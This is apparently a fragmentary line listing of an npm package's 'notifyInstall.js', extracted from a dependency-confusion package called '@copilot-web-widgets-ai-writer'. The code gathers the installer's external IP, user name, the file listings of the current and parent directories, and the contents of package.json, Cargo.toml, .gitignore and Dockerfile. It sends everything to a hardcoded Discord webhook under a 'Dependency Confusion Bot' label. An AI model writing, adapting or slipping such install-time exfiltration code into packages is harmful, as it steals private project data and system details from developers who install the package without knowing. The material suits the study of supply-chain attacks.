// File: tmp/tmph61igccx/@copilot-web-widgets-ai-writer/package/src/notifyInstall.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 3: const fs = require('fs')
Line 4: const path = require('path')
Line 7: (_tmp_0 = https.get('https://api.ipify.org', (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => { callback(data); });
    }))
Line 10: callback(data)
Line 13: callback(null)
Line 19: path.join(process.cwd(), 'package.json')
Line 20: const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf-8'))
Line 30: path.join(process.cwd(), 'package.json')
Line 31: const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf-8'))
Line 42: path.join(currentPath, 'node_modules')
Line 43: path.join(currentPath, 'node_modules', '..')
Line 45: path.join(currentPath, '..')
Line 52: fs.readFileSync(filePath, 'utf-8')
Line 58: os.userInfo()
Line 60: findAboveNodeModules()
Line 61: const filesInDirectory = "```" + fs.readdirSync(currentDirectory).join('\n') + "```"
Line 62: const filesInUpperDirectory = "```" + fs.readdirSync(upperDirectory).join('\n') + "```"
Line 66: _tmp_3.push("package.json")
Line 67: _tmp_3.push("Cargo.toml")
Line 68: _tmp_3.push(".gitignore")
Line 69: _tmp_3.push("Dockerfile")
Line 75: path.join(upperDirectory, file)
Line 77: fields.push({ name: file, value: "```" + fileContent + "```", inline: false })
Line 81: {
    const embedPayload = JSON.stringify({
        embeds: [{
            title: "Package Installation",
            color: 3447003,
            fields: [
                { name: "Package", value: packageName, inline: true },
                { name: "Version", value: "`" + getPackageVersion() + "`", inline: true },
                { name: "User", value: currentUser, inline: false },
                { name: "Current Directory", value: "`" + currentDirectory + "`", inline: false },
                { name: "Files in " + currentDirectory, value: filesInDirectory || "None", inline: false },
                { name: "Files in " + upperDirectory, value: filesInUpperDirectory || "None", inline: false },
                { name: "External IP", value: "`" + externalIP + "`" || "Unavailable", inline: false },
                ...fields
            ],
            footer: {
                text: "Dependency Confusion Bot"
            },
            timestamp: new Date().toISOString()
        }]
  ...
Line 83: _tmp_6.push({
            title: "Package Installation",
            color: 3447003,
            fields: [
                { name: "Package", value: packageName, inline: true },
                { name: "Version", value: "`" + getPackageVersion() + "`", inline: true },
                { name: "User", value: currentUser, inline: false },
                { name: "Current Directory", value: "`" + currentDirectory + "`", inline: false },
                { name: "Files in " + currentDirectory, value: filesInDirectory || "None", inline: false },
                { name: "Files in " + upperDirectory, value: filesInUpperDirectory || "None", inline: false },
                { name: "External IP", value: "`" + externalIP + "`" || "Unavailable", inline: false },
                ...fields
            ],
            footer: {
                text: "Dependency Confusion Bot"
            },
            timestamp: new Date().toISOString()
        })
Line 87: _tmp_8.push({ name: "Package", value: packageName, inline: true })
Line 88: _tmp_8.push({ name: "Version", value: "`" + getPackageVersion() + "`", inline: true })
Line 89: _tmp_8.push({ name: "User", value: currentUser, inline: false })
Line 90: _tmp_8.push({ name: "Current Directory", value: "`" + currentDirectory + "`", inline: false })
Line 91: _tmp_8.push({ name: "Files in " + currentDirectory, value: filesInDirectory || "None", inline: false })
Line 92: _tmp_8.push({ name: "Files in " + upperDirectory, value: filesInUpperDirectory || "None", inline: false })
Line 93: _tmp_8.push({ name: "External IP", value: "`" + externalIP + "`" || "Unavailable", inline: false })
Line 94: _tmp_8.push(...fields)
Line 103: const webhookURL = 'https://discord.com/api/webhooks/1293639013881872394/Dm-VH1AcEzigVUCDipHGmu-zDhb3UnmEbCoduz9fvuGPNhAzu8S4ufv0Q2bhwz-fW6wA'
Line 116: const req = https.request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            console.log('Embed message sent to Discord', data);
        });
    })
Line 128: req.write(embedPayload)
Line 129: req.end()
